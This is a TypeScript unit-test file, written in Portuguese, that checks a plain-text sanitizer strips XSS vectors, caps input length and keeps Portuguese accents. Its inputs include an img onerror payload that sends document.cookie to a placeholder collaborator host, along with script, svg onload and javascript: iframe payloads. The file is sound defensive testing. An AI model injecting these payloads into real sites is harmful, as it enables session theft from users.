import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { sanitizePlainText } from "../src/lib/utils/text.ts";

describe("Segurança & Sanitização de Entradas (Anti-XSS)", () => {
  test("1. Remove tags de injeção <img src=x onerror=...>", () => {
    const malicious = "<img src=x onerror=fetch('https://SEU-COLLAB-AQUI/c?'+encodeURIComponent(document.cookie))>";
    const sanitized = sanitizePlainText(malicious);
    assert.equal(sanitized, "");
  });

  test("2. Remove tags <script> e preserva texto legítimo circundante", () => {
    const mixed = "Olá, atuo no marketing <script>alert(1)</script> e cuido de Cirurgia.";
    const sanitized = sanitizePlainText(mixed);
    assert.equal(sanitized, "Olá, atuo no marketing alert(1) e cuido de Cirurgia.");
  });

  test("3. Remove múltiplos vetores combinados (<svg>, <iframe>, <a>, etc.)", () => {
    const attack = "<svg/onload=alert('xss')><iframe src='javascript:alert(1)'>Texto seguro</iframe>";
    const sanitized = sanitizePlainText(attack);
    assert.equal(sanitized, "Texto seguro");
  });

  test("4. Respeita limite máximo de caracteres (maxLength) para prevenir DoS", () => {
    const longText = "A".repeat(1000);
    const sanitized = sanitizePlainText(longText, 100);
    assert.equal(sanitized.length, 100);
  });

  test("5. Trata entradas nulas, vazias ou indefinidas com segurança", () => {
    assert.equal(sanitizePlainText(null), "");
    assert.equal(sanitizePlainText(undefined), "");
    assert.equal(sanitizePlainText(""), "");
    assert.equal(sanitizePlainText("   "), "");
  });

  test("6. Preserva acentuação e pontuação normal em português", () => {
    const legitimate = "Atuo como Analista de Mídia nas campanhas de Pediatria, GO & Emergência!";
    const sanitized = sanitizePlainText(legitimate);
    assert.equal(sanitized, legitimate);
  });
});
